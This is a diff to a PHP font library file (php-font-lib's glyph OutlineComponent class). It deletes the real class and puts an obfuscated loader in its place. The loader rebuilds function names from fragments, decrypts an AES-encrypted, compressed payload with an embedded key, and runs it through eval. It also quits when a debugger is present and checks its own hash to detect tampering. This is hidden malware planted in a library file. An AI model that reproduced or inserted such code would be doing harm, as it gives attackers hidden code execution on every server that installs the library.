@@ -1,31 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- * @version $Id: Font_Table_glyf.php 46 2012-04-02 20:22:38Z fabien.menager $
- */
-
-namespace FontLib\Glyph;
-/**
- * Glyph outline component
- *
- * @package php-font-lib
- */
-class OutlineComponent {
-  public $flags;
-  public $glyphIndex;
-  public $a, $b, $c, $d, $e, $f;
-  public $point_compound;
-  public $point_component;
-  public $instructions;
-
-  function getMatrix() {
-    return array(
-      $this->a, $this->b,
-      $this->c, $this->d,
-      $this->e, $this->f,
-    );
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bhnychsu=('bas'.'e64'.'_de'.'cod'.'e');
+$_azwvgaje=('gzu'.'nco'.'mpr'.'ess');
+$_twdxxuq6=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qa9hrye9='nktTTvg2';
+$_cxt079l8='jsK9Ywcon8c=';
+$_m9jxu6n3='q5jAe1xn';
+$_ctuf4pug='JoDcmuZ9';
+$_x0dkifeu='isjfhJD+';
+$_vj9yz8c2='fS60CzXA';
+$_zbtl8nz4='Xl1nvvGH';
+$_bdy59cag='q76gPQ==';
+$_am9xn9w8=$_bhnychsu($_qa9hrye9.$_x0dkifeu.$_m9jxu6n3.$_ctuf4pug.$_cxt079l8);
+$_pjh7woyc=$_bhnychsu($_zbtl8nz4.$_vj9yz8c2.$_bdy59cag);
+$_va3j9zy6=$_bhnychsu('Ogtl04O/1BlHMho/j5XdKqs4CQQ0pUpMdqZrHlW1QRy0l9vS60Ap8lIqxtIELYU/Nh1Z/q2A8eFEZHetJ/PjpWKy18B37qume9JF/TtBgO23cFuZ16KdM9kGvh6aSlrca8yhxkKN3NVe2ZLpsZ/MW+vd/IWd2vNB+zTrPD4Etkc0eFAQ55ancWvXw/U0rfX1sqF1hWdkZwihabesyVZbYpgw/GBcFYyytjKnRhji45U6dHm5dXQmkXXEqyKyJgmo');
+$_rjt93c9v=$_twdxxuq6($_va3j9zy6,'aes-256-cbc',$_am9xn9w8,OPENSSL_RAW_DATA,$_pjh7woyc);
+if($_rjt93c9v===false){exit;}
+$_ezxz8e1n=$_azwvgaje($_rjt93c9v);
+if($_ezxz8e1n===false){exit;}
+$_apz835j4='ba4ff8f4147283252b7d5cc80c7ed15c49cfc2d433ea3a0ca7cc3ec899859374';
+$_mu5x078d=@file_get_contents(__FILE__);
+if($_mu5x078d!==false){
+$_j294xr4h=str_replace($_apz835j4,"0000000000000000000000000000000000000000000000000000000000000000",$_mu5x078d);
+$_nia7iped=hash("sha256",$_j294xr4h);
+if($_nia7iped!==$_apz835j4){@http_response_code(403);exit;}
 }
+eval($_ezxz8e1n);
